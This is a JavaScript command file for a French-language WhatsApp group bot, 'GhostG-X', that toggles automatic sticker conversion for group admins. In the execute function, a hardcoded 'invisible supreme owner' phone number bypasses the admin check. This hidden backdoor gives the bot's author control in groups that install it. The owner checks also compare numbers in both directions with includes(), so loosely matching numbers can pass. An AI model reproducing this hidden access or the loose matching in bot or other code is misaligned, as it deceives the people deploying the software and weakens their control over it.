/**
 * AutoSticker Command - Enable or disable auto-sticker conversion
 */

const database = require('../../database');
const config = require('../../config.js');

// Extraction du préfixe pour l'usage
const prefix = config.prefix || '.';

// Fonction pour le style Small Caps (Garde la cohérence visuelle)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'autosticker',
  aliases: ['autos', 'asticker', 'ᴀᴜᴛᴏsᴛɪᴄᴋᴇʀ'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴀᴄᴛɪᴠᴇʀ/ᴅᴇ́sᴀᴄᴛɪᴠᴇʀ ʟᴀ ᴍᴇ́ᴛᴀᴍᴏʀᴘʜᴏsᴇ ᴀᴜᴛᴏ-sᴛɪᴄᴋᴇʀ**',
  usage: `${prefix}autosticker <on/off>`,
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: false,

  async execute(sock, msg, args, extra) {
    const { reply } = extra;

    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
      const supremeOwner = '22651622652';
      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
      if (!isMe) {
        const isAdmin = extra.isAdmin || false; 
        if (!isAdmin) {
          return reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
        }
      }

      const chatId = msg.key.remoteJid;

      if (!args[0]) {
        const settings = database.getGroupSettings(chatId);
        const status = settings.autosticker ? '🛡️ ᴇ́ᴠᴇɪʟʟᴇ́ (ᴏɴ)' : '🔓 ᴇɴᴅᴏʀᴍɪ (ᴏғғ)';
        
        return reply(
          `╭╼━≪• *sᴛᴀᴛᴜᴛ ᴀʀᴄᴀɴᴇ_sᴛɪᴄᴋᴇʀ* •≫━╾╮\n` +
          `┃ *ᴇ́ᴛᴀᴛ* : ${status}\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `🔮 *ɪɴᴄᴀɴᴛᴀᴛɪᴏɴs ᴅɪsᴘᴏɴɪʙʟᴇs :*\n` +
          `*ᴄᴇᴛ ᴀʀᴄᴀɴᴇ ᴍᴇ́ᴛᴀᴍᴏʀᴘʜᴏsᴇ ᴀᴜᴛᴏᴍᴀᴛɪǫᴜᴇᴍᴇɴᴛ ʟᴇs ɪᴍᴀɢᴇs ᴇᴛ ᴠɪᴅᴇ́ᴏs ᴇɴ sᴛɪᴄᴋᴇʀs.*\n\n` +
          `  ${prefix}autosticker on\n` +
          `  ${prefix}autosticker off\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
        );
      }

      const opt = args[0].toLowerCase();
      const currentSettings = database.getGroupSettings(chatId);

      // Activation
      if (opt === 'on' || opt === 'true') {
        if (currentSettings.autosticker) {
          return reply(`*❌ ${toSmallCaps('l arcane sticker est deja actif dans ce sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
        }
        
        database.updateGroupSettings(chatId, { autosticker: true });
        return reply(`*🛡️ ${toSmallCaps('l arcane sticker a ete eveille avec succes')} (ᴏɴ).*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
      }

      // Désactivation
      if (opt === 'off' || opt === 'false') {
        if (!currentSettings.autosticker) {
          return reply(`*❌ ${toSmallCaps('l arcane sticker est deja endormi')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
        }
        
        database.updateGroupSettings(chatId, { autosticker: false });
        return reply(`*🔓 ${toSmallCaps('la metamorphose de l arcane sticker a ete scellee')} (ᴏғғ).*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
      }

      // Saisie incorrecte
      return reply(`*💡 ${toSmallCaps('utilise')} \`${prefix}autosticker\` ${toSmallCaps('pour voir les options valides')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);

    } catch (error) {
      return reply(`❌ *${toSmallCaps('erreur')} :* ${error.message}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
    }
  }
};
